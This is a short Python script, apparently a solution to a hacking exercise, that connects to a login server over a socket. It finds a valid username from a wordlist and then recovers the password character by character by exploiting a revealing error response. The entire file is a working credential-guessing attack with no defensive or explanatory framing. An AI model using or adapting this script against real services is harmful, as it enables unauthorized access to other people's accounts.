import sys
import socket
import json
from path import file_path


def send_and_receive(login, password):
    json_req = json.dumps({'login': login, 'password': password})
    client_socket.send(json_req.encode())
    return client_socket.recv(256).decode()


def find_login():
    with open(file_path, 'r') as file:
        for login in file:
            if send_and_receive(login.strip(), '') == '{"result": "Exception happened during login"}':
                break
        return login.strip()


def find_pass(login):
    password = ''
    flag = False
    chars = [chr(i) for i in range(65, 91)] + [chr(i) for i in range(61, 123)] + [chr(i) for i in range(48, 58)]
    while not flag:
        for ch in chars:
            response = send_and_receive(login.strip(), password + ch)
            if response == '{"result": "Connection success!"}':
                return json.dumps({'login': login, 'password': password + ch})
            elif response == '{"result": "Exception happened during login"}':
                password += ch


if __name__ == "__main__":
    if len(sys.argv) < 3:  # Running the program should look like "python3 hack.py localhost 9090"
        print('Input: IP address and port for sending')
        sys.exit(1)
    ip, port = sys.argv[1], int(sys.argv[2])

    with socket.socket() as client_socket:
        client_socket.connect((ip, port))
        print(find_pass(find_login()))
